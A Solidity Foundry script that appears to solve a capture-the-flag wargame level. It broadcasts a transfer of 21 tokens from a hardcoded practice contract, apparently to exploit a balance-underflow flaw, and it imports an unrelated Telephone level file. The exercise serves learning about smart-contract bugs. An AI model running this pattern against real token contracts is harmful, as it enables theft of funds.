// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/04_Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external returns (uint256);
}

contract TokenAttack is Script {
    uint256 privateKey = vm.envUint("PRIVATE_KEY");
    address attacker = vm.addr(privateKey);

    address target = 0x7e23A27581916AbC3505C3cdF1ecA11724d436e6;

    function run() external {
        vm.startBroadcast(privateKey);
        IToken token = IToken(target);
        token.transfer(address(1), 21);
        vm.stopBroadcast();
    }
}
